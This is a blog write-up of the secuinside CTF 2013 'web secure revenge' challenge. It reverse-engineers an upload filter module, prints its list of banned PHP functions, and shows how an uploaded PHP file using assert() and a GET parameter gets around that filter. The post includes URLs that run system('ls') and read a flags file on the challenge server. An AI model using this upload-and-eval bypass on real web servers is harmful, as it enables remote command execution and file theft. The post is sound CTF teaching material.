---
title: secuinsideCTF 2013 web secure revenge writeup
author: lovelydream
layout: post
permalink: /secuinsidectf-2013-web-secure-revenge-writeup/
categories:
  - Uncategorized
---
This not a hard one.

### **Bin Part**

mod_dontwebhack350.so is a php plugin which helps the upload site to filter files.

Opening it with IDA, filtering function *dontwebhack input filter()* is founded. The code below catches our sight:

    if ( check_extension_name(v12, dest, v15) == 1 )
        *(_DWORD *)v15 = 1;
    if ( *(_DWORD *)v15 )
        ap_log_cerror("mod_dontwebhack300.c", 141, 3, 0, v12, *((_DWORD *)v15 + 3), v9);
    if ( check_bad_php_string(src) == 1 )
    {
        ap_log_cerror("mod_dontwebhack300.c", 144, 3, 0, v12, "Try again.", v9);
        result = -1;
    }
    

As mentioned above, strings that the file contains and the file&#8217;s extension name are checked.

After a bit more exploration, it is safe to draw the conlusion that only these extension names *&#8220;.php&#8221; &#8220;.phtml&#8221; &#8220;.ht&#8221;* can be executed.

    .rodata:00000F75 aPhp            db 'php',0              ; DATA XREF: check_extension_name+31o
    .rodata:00000F79 aPhtml          db 'phtml',0            ; DATA XREF: check_extension_name:loc_ACFo
    .rodata:00000F7F a_ht            db '.ht',0              ; DATA XREF: check_extension_name:loc_AF8o
    

and these strings are forbiddened in the upload file:

    .data:00003060 off_3060        dd offset a?            ; DATA XREF: check_bad_php_string+17o
    .data:00003060                                         ; "&lt;?&quot;
    .data:00003064                 dd offset aKey          ; &quot;key&quot;
    .data:00003068                 dd offset aFlag         ; &quot;flag&quot;
    .data:0000306C                 dd offset aLocate       ; &quot;locate&quot;
    .data:00003070                 dd offset aInclude      ; &quot;include&quot;
    .data:00003074                 dd offset aRequire      ; &quot;require&quot;
    .data:00003078                 dd offset aFopen        ; &quot;fopen&quot;
    .data:0000307C                 dd offset aPassthru     ; &quot;passthru&quot;
    .data:00003080                 dd offset aFpassthru    ; &quot;fpassthru&quot;
    .data:00003084                 dd offset aSystem       ; &quot;system&quot;
    .data:00003088                 dd offset asc_F37       ; &quot;`&quot;
    .data:0000308C                 dd offset aExecl        ; &quot;execl&quot;
    .data:00003090                 dd offset aOpen         ; &quot;open&quot;
    .data:00003094                 dd offset aPopen        ; &quot;popen&quot;
    .data:00003098                 dd offset aEscapeshellcmd ; &quot;escapeshellcmd&quot;
    

### **Web Part**

Easy to find this php script in *upload.txt*:

    if($_SERVER[&#039;REQUEST_METHOD&#039;] == &quot;POST&quot;) 
    {
    
        $uploaddir = &#039;/var/www/uploads/&#039; . md5(crypt($_SERVER[&quot;REMOTE_ADDR&quot;], $_POST[&#039;code&#039;] )) . &#039;/&#039;;
    
        if(is_dir($uploaddir) == false)
            mkdir($uploaddir);
        if(strstr($_FILES[&#039;data&#039;][&#039;name&#039;], &quot;./&quot;) != FALSE) {
        exit;
        }
    
    
        if(strstr($_FILES[&#039;data&#039;][&#039;name&#039;], &quot;../&quot;) != FALSE) {
            exit;
        }
        $uploadfile = $uploaddir . basename($_FILES[&#039;data&#039;][&#039;name&#039;]);
        if (move_uploaded_file($_FILES[&#039;data&#039;][&#039;tmp_name&#039;], $uploadfile)) {
                echo &quot;alert('Success'); document.href='./';\n";
        } else {
                print "alert('failed'); document.href='./';";
        }
    
    }
    else { ...
    

We find that the file folder name is produced by `md5(crypt($_SERVER["REMOTE_ADDR"], $_POST['code'] ))`.

It&#8217;s time to upload some php scripts.Considering the fact that special functions are banned as mentioned in the bin part, if we want to execute some commands, we can use *assert()*.

Such php file like this is to uploaded:

Test it.To calculate the folder name and give the get data:

    http://59.9.131.155:9852/uploads/2438fc3567fb30f9e4157e19fd5f8f1e/example.php?name=system('ls%20../../../')
    

Files and folders are listed.The next step is to find out the way to read the key file.*fopen()* and *die()* is to be used. *cat* command also takes effect.

To see that all the functions which are used to read files in php script are banned by .so.

**So the *get* variable is used due to no filtering on url.**

    http://59.9.131.155:9852/uploads/2438fc3567fb30f9e4157e19fd5f8f1e/example.php?name=die(fread(fopen(%22/home/dwh_revenge/
    flags%22,%22r%22),filesize(%22/home/dwh_revenge/flags%22)))
    

Bingo!